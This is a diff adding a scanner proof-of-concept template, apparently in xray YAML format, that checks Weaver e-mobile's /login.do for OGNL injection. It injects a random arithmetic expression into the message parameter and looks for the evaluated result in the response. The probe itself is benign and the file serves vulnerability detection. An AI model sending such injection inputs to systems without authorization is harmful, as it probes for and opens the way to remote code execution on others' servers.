@@ -1,0 +1,21 @@
+name: poc-yaml-e-mobile-ognl-inject
+manual: true
+
+transport: http
+set:
+  numa: randomInt(1000, 5000)
+  numb: randomInt(5000, 10000)
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: '/login.do?message={{numa}}*{{numb}}'
+      
+    expression: response.status == 200 && response.body.bcontains(bytes(string(numa * numb)))
+expression: r0()
+
+detail:
+  author: laohuan12138
+  links:
+    - https://gitee.com/cute-guy/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md
